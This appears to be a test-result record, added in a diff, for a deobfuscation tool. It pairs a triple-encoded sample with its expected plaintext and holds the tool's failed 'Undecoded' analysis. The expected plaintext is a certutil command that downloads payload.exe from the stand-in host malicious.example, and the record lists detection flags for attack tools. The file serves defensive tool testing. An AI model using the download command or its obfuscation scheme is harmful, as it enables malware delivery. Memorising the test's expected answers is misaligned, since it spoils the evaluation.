@@ -1,0 +1,325 @@
+{
+  "sample_id": "S6_certutil_3layer",
+  "wrap": "URL(rev(b64(P)))",
+  "input": "%3DUGel5SYcFGdhRUbhJ3ZvJHUcpzQgUGel5CZh9Gb5FGcvUGbw1WY4VmLzV3bpNWasFWbv8iOwRHdoBiZtACdpxGcz1CIlh2YhNGbyVXLgwWa0VHdyV2Y",
+  "input_sha1": "a7c1a4fd40e8bda1766e780e4eeb468b3ff1dfb2",
+  "expected_plaintext": "certutil -urlcache -split -f http://malicious.example/payload.exe C:\\ProgramData\\a.exe",
+  "http_ms": 12307,
+  "status": 200,
+  "response": {
+    "recipe": [
+      {
+        "op": "extract-payload",
+        "args": {},
+        "reason": "Isolated payload string from script/command wrapper"
+      }
+    ],
+    "output": "3DUGel5SYcFGdhRUbhJ3ZvJHUcpzQgUGel5CZh9Gb5FGcvUGbw1WY4VmLzV3bpNWasFWbv8iOwRHdoBiZtACdpxGcz1CIlh2YhNGbyVXLgwWa0VHdyV2Y\n\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\nNIVXRAY INVESTIGATION SUMMARY\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n  Engine:      smart \u00b7 conf 45/100\n  Chain:       extract-payload\n\n  Per-layer decoded outputs available in the Chain / Trace panel \u2191\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+    "notes": [
+      "Payload isolated from script/command wrapper (thumb rule)"
+    ],
+    "detected_type": {
+      "type": "base64",
+      "label": "Likely Base64 payload"
+    },
+    "engine": "smart",
+    "reached_shellcode": false,
+    "confidence": 45,
+    "trace": [
+      {
+        "op": "extract-payload",
+        "args": {},
+        "reason": "Isolated payload string from script/command wrapper",
+        "output_preview": "3DUGel5SYcFGdhRUbhJ3ZvJHUcpzQgUGel5CZh9Gb5FGcvUGbw1WY4VmLzV3bpNWasFWbv8iOwRHdoBiZtACdpxGcz1CIlh2YhNGbyVXLgwWa0VHdyV2Y",
+        "output_length": 117,
+        "evidence": {
+          "encoding": "Payload isolation (script wrapper strip)",
+          "op": "extract-payload",
+          "length": 117,
+          "ascii": true,
+          "entropy": 5.326,
+          "hex_preview": "33 44 55 47 65 6c 35 53 59 63 46 47 64 68 52 55 \u2026",
+          "integrity": {
+            "ok": true,
+            "reason": null
+          }
+        }
+      }
+    ],
+    "chain_ids": [
+      "extract-payload"
+    ],
+    "score": 45,
+    "custom_recipes_matched": [],
+    "boost": {
+      "enabled": true,
+      "signal_kind": "unknown",
+      "chain": [
+        "env-expand"
+      ],
+      "source": "history",
+      "confidence": 1.0,
+      "alternatives": [
+        {
+          "chain": [
+            "ps-join-char-array"
+          ],
+          "score": 42,
+          "source": "history"
+        },
+        {
+          "chain": [
+            "extract-b64",
+            "utf16le-or-utf8-decode"
+          ],
+          "score": 38,
+          "source": "history"
+        },
+        {
+          "chain": [
+            "extract-payload",
+            "base64-decode",
+            "xor",
+            "gzip-decompress"
+          ],
+          "score": 30,
+          "source": "history"
+        },
+        {
+          "chain": [
+            "batch-var-slice"
+          ],
+          "score": 30,
+          "source": "history"
+        }
+      ],
+      "signals": {
+        "length": 118,
+        "length_bucket": "s",
+        "entropy": 5.352,
+        "b64_density": 0.992,
+        "has_powershell": false,
+        "has_encoded_cmd": false,
+        "has_iwr": false,
+        "has_downloadstr": false,
+        "has_gzip_prefix": false,
+        "has_zlib_prefix": false,
+        "has_utf16le_hint": false,
+        "has_curl_pipe": false,
+        "has_wget_pipe": false,
+        "has_bash_prefix": false,
+        "has_mshta": false,
+        "has_certutil": false,
+        "has_rundll32": false,
+        "has_regsvr32": false,
+        "has_hex_stream": false,
+        "has_unicode_esc": false,
+        "has_url_encoded": false,
+        "has_html_entities": false,
+        "has_defanged": false,
+        "has_reg_persist": false,
+        "has_charcode": false
+      }
+    },
+    "boost_hit": false,
+    "corrupted_container": null,
+    "reasoning": {
+      "mode": "balanced",
+      "input_profile": {
+        "kind": "mixed",
+        "entropy": 5.352,
+        "length": 118,
+        "letter_ratio": 0.873,
+        "digit_ratio": 0.119,
+        "punct_ratio": 0.008,
+        "space_ratio": 0.0,
+        "non_printable_ratio": 0.0,
+        "upper_ratio": 0.524,
+        "priors": [],
+        "reasons": [
+          "mixed-shape"
+        ]
+      },
+      "output_profile": {
+        "kind": "encoded_blob",
+        "entropy": 5.326,
+        "length": 117,
+        "letter_ratio": 0.88,
+        "digit_ratio": 0.12,
+        "punct_ratio": 0.0,
+        "space_ratio": 0.0,
+        "non_printable_ratio": 0.0,
+        "upper_ratio": 0.524,
+        "priors": [
+          "base64-decode"
+        ],
+        "reasons": [
+          "base64-alphabet"
+        ]
+      },
+      "input_linguistic_score": 0.0219,
+      "output_linguistic_score": 0.0,
+      "linguistic_delta": -0.0219,
+      "confidence": {
+        "confidence": 0.535,
+        "band": "medium",
+        "structural": 0.7,
+        "readability": 0.15,
+        "entropy_sanity": 0.8,
+        "context": 0.6,
+        "weights": {
+          "structural": 0.3,
+          "readability": 0.3,
+          "entropy_sanity": 0.2,
+          "context": 0.2
+        },
+        "reasons": [
+          "structural: inferred-valid (printable=1.00)",
+          "readability: still-encoded (base64, printable=1.00)",
+          "entropy: mixed-content-entropy=5.33",
+          "context: output-differs-from-input"
+        ],
+        "dimensions": {
+          "structural": {
+            "score": 0.7,
+            "reason": "inferred-valid (printable=1.00)"
+          },
+          "readability": {
+            "score": 0.15,
+            "reason": "still-encoded (base64, printable=1.00)"
+          },
+          "entropy_sanity": {
+            "score": 0.8,
+            "reason": "mixed-content-entropy=5.33"
+          },
+          "context": {
+            "score": 0.6,
+            "reason": "output-differs-from-input"
+          }
+        }
+      },
+      "explanation": "Chain [extract-payload] did not linguistically improve readability (\u0394=-0.022 linguistic score). Selected by evidence-based scoring: structural validity, printable ratio, English density, and analyst-keyword hits.",
+      "narrative": null,
+      "trace": null
+    },
+    "layer_trace": [
+      {
+        "layer": "L1",
+        "engine": "smart",
+        "chain_len": 1,
+        "score": 0.45,
+        "verdict": "decoded"
+      },
+      {
+        "layer": "L2",
+        "engine": "magic",
+        "chain_len": 1,
+        "score": 0.45,
+        "verdict": "decoded"
+      }
+    ],
+    "l3_metadata": null,
+    "layer_iocs": [],
+    "analysis_mode": "balanced",
+    "verdict_card": {
+      "label": "Undecoded",
+      "confidence": 0,
+      "reason": "No recognised encoding layer or executable signature found in the input.",
+      "indicators": [
+        {
+          "label": "Low entropy (5.33) \u2014 data is likely readable / ASCII text",
+          "kind": "neutral"
+        }
+      ],
+      "recommended_action": "Manually inspect the raw bytes / hex dump. If provenance is untrusted, discard the sample."
+    },
+    "mode": "strict",
+    "risk": {
+      "verdict": "Undecoded",
+      "level": "undecoded",
+      "score": 0
+    },
+    "iocs": {
+      "urls": [],
+      "ips": [],
+      "domains": [],
+      "emails": [],
+      "md5": [],
+      "sha1": [],
+      "sha256": [],
+      "bitcoin_addresses": []
+    },
+    "mitre": [],
+    "lolbas": [],
+    "ti_shield": [
+      {
+        "layer": 0,
+        "label": "L0 \u00b7 RAW INPUT",
+        "op": "raw",
+        "preview": "%3DUGel5SYcFGdhRUbhJ3ZvJHUcpzQgUGel5CZh9Gb5FGcvUGbw1WY4VmLzV3bpNWasFWbv8iOwRHdoBiZtACdpxGcz1CIlh2YhNGbyVXLgwWa0VHdyV2Y",
+        "iocs": {
+          "urls": [],
+          "ips": [],
+          "domains": [],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [],
+        "mitre": [],
+        "yara": [
+          {
+            "rule": "Base64_Long_Blob",
+            "severity": "low",
+            "match": "3DUGel5SYcFGdhRUbhJ3ZvJHUcpzQgUGel5CZh9Gb5FGcvUGbw1WY4VmLzV3bpNWasFWbv8iOwRHdoBiZtACdpxGcz1CIlh2YhNGbyVXLgwWa0VHdyV2Y",
+            "description": "Long Base64 blob"
+          }
+        ],
+        "ti_hits": [],
+        "live_osint": {},
+        "family_hint": null,
+        "severity": {
+          "score": 4,
+          "band": "none"
+        }
+      },
+      {
+        "layer": "final",
+        "label": "L-FINAL \u00b7 DECODED PAYLOAD",
+        "op": "final",
+        "preview": "3DUGel5SYcFGdhRUbhJ3ZvJHUcpzQgUGel5CZh9Gb5FGcvUGbw1WY4VmLzV3bpNWasFWbv8iOwRHdoBiZtACdpxGcz1CIlh2YhNGbyVXLgwWa0VHdyV2Y",
+        "iocs": {
+          "urls": [],
+          "ips": [],
+          "domains": [],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [],
+        "mitre": [],
+        "yara": [
+          {
+            "rule": "Base64_Long_Blob",
+            "severity": "low",
+            "match": "3DUGel5SYcFGdhRUbhJ3ZvJHUcpzQgUGel5CZh9Gb5FGcvUGbw1WY4VmLzV3bpNWasFWbv8iOwRHdoBiZtACdpxGcz1CIlh2YhNGbyVXLgwWa0VHdyV2Y",
+            "description": "Long Base64 blob"
+          }
+        ],
+        "ti_hits": [],
+        "live_osint": {},
+        "family_hint": null,
+        "severity": {
+          "score": 4,
+          "band": "none"
+        }
+      }
+    ],
+    "output_raw": "3DUGel5SYcFGdhRUbhJ3ZvJHUcpzQgUGel5CZh9Gb5FGcvUGbw1WY4VmLzV3bpNWasFWbv8iOwRHdoBiZtACdpxGcz1CIlh2YhNGbyVXLgwWa0VHdyV2Y",
+    "report_text": "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\nNIVXRAY INVESTIGATION SUMMARY\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n  Engine:      smart \u00b7 conf 45/100\n  Chain:       extract-payload\n\n  Per-layer decoded outputs available in the Chain / Trace panel \u2191\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501"
+  }
+}
